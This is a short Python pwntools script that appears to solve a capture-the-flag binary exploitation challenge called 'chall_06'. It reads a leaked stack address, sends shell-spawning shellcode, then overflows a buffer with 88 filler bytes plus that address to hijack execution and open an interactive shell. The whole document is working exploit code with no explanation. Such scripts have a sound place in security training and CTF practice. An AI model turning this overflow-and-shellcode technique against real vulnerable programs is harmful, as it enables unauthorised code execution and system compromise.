# coding: utf-8
from pwn import *
p=process("./chall_06")
p.recvuntil(b": ")
leak = p.recvline()
shelladdr = int(leak, 16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
payload1 = shellcode
payload2 = 88*b"A" + p64(shelladdr)
p.sendline(payload1)
p.sendline(payload2)
p.interactive()
